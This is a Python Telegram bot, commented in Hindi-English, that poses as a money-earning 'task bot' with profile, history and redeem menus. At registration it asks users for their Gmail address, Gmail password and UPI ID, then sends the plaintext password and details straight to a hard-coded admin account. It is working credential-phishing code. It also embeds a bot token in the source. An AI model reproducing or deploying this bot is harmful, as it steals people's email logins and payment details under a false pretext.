import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Logging setup
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Aapki Admin Telegram ID
ADMIN_ID = 5116589075 

# In-memory Database
users_db = {}  # {user_id: {"username": str, "gmail": str, "pass": str, "upi": str, "balance": float, "history": []}}
pending_redeems = [] 

TOKEN = "8681941726:AAFll1hp4rZtCHRL_4t-gpgn_frGSZzif5c"

# --- START & REGISTRATION ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in users_db:
        await show_main_menu(update, context)
    else:
        await update.message.reply_text(
            "👋 Welcome! Task bot mein register karne ke liye apni **Gmail ID** bhejein:"
        )
        context.user_data['state'] = 'WAITING_GMAIL'

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No Username"
    text = update.message.text
    state = context.user_data.get('state')

    if state == 'WAITING_GMAIL':
        context.user_data['gmail'] = text
        context.user_data['state'] = 'WAITING_PASS'
        await update.message.reply_text("🔑 Ab apna **Password** bhejein:")
        
    elif state == 'WAITING_PASS':
        context.user_data['pass'] = text
        context.user_data['state'] = 'WAITING_UPI'
        await update.message.reply_text("💳 Ab apni **UPI ID** bhejein (Jisme redeem milega):")
        
    elif state == 'WAITING_UPI':
        upi = text
        gmail = context.user_data.get('gmail')
        password = context.user_data.get('pass')
        
        # User account create karein
        users_db[user_id] = {
            "username": username,
            "gmail": gmail,
            "pass": password,
            "upi": upi,
            "balance": 0.0,
            "history": ["Account Created Successfully"]
        }
        context.user_data['state'] = None
        
        await update.message.reply_text("✅ **Registration Successful!**")
        await show_main_menu(update, context)
        
        # Admin ko naye user ki profile ki notification bhejna
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"👤 **New User Registered!**\n\n"
                    f"🆔 User ID: `{user_id}`\n"
                    f"🔗 Username: @{username}\n"
                    f"📧 Gmail: `{gmail}`\n"
                    f"🔑 Password: `{password}`\n"
                    f"💳 UPI ID: `{upi}`"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Admin ko user details bhejne mein error: {e}")
        
    elif user_id == ADMIN_ID and text.startswith("/addrs"):
        # Format: /addrs userid amount
        try:
            parts = text.split()
            target_user = int(parts[1])
            amount = float(parts[2])
            if target_user in users_db:
                users_db[target_user]["balance"] += amount
                users_db[target_user]["history"].append(f"Added Rs.{amount} by Admin")
                await update.message.reply_text(f"✅ Successfully added Rs.{amount} to user {target_user}")
                
                # User ko bhi notify karein ki balance add ho gaya hai
                try:
                    await context.bot.send_message(
                        chat_id=target_user,
                        text=f"🎉 Aapke account mein Admin dwara **Rs.{amount}** add kar diye gaye hain!"
                    )
                except:
                    pass
            else:
                await update.message.reply_text("❌ User ID database mein nahi mili.")
        except Exception:
            await update.message.reply_text("❌ Galat format! Use karein: `/addrs <user_id> <amount>`")

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("👤 My Profile", callback_data="profile")],
        [InlineKeyboardButton("📋 Task History", callback_data="history")],
        [InlineKeyboardButton("💸 Redeem Request", callback_data="redeem")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text("📌 **Main Menu:**", reply_markup=reply_markup)
    else:
        await update.message.reply_text("📌 **Main Menu:**", reply_markup=reply_markup)

# --- CALLBACK HANDLERS ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "profile":
        user = users_db.get(user_id)
        if not user:
            await query.message.reply_text("Pehle /start karein.")
            return
        
        profile_text = (
            f"👤 **Your Profile**\n\n"
            f"📧 Gmail: `{user['gmail']}`\n"
            f"💳 UPI ID: `{user['upi']}`\n"
            f"💰 Balance: `Rs.{user['balance']}`"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_home")]]
        await query.message.edit_text(profile_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "history":
        user = users_db.get(user_id)
        history_list = "\n".join([f"• {item}" for item in user['history']]) if user['history'] else "No history yet."
        history_text = f"📋 **Task & Activity History:**\n\n{history_list}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_home")]]
        await query.message.edit_text(history_text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "redeem":
        user = users_db.get(user_id)
        if user['balance'] <= 0:
            await query.answer("❌ Aapka balance 0 hai, redeem nahi lag sakta!", show_alert=True)
            return
        
        amount = user['balance']
        pending_redeems.append({"user_id": user_id, "amount": amount, "upi": user['upi'], "gmail": user['gmail']})
        
        # Balance zero karein aur history update karein
        user['balance'] = 0.0
        user['history'].append(f"Redeem requested for Rs.{amount}")
        
        # Admin ko redeem request notify karein
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"🚨 **New Redeem Request!**\n\n"
                    f"👤 User ID: `{user_id}`\n"
                    f"🔗 Username: @{user['username']}\n"
                    f"📧 Gmail: `{user['gmail']}`\n"
                    f"💳 UPI: `{user['upi']}`\n"
                    f"💰 Amount: `Rs.{amount}`"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Admin ko redeem message bhejne mein error: {e}")

        await query.answer("✅ Aapka redeem request admin ke paas bhej diya gaya hai!", show_alert=True)
        await show_main_menu(update, context)

    elif data == "back_home":
        await show_main_menu(update, context)

# --- MAIN FUNCTION ---
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Bot started successfully...")
    application.run_polling()

if __name__ == "__main__":
    main()
                  
